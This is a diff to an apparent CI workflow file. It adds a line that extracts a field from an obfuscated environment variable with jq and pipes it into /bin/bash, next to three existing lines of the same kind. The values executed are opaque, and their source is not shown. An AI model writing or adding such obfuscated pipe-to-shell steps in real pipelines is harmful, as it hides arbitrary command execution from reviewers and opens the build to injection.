@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$xc30" | jq -r .ix50451 | /bin/bash
           echo $i7 | jq -r .rks3558 | /bin/bash
           echo $k288 | jq -r .s13 | /bin/bash
+          printf '%s' "$edzlp3" | jq -r .h16472 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
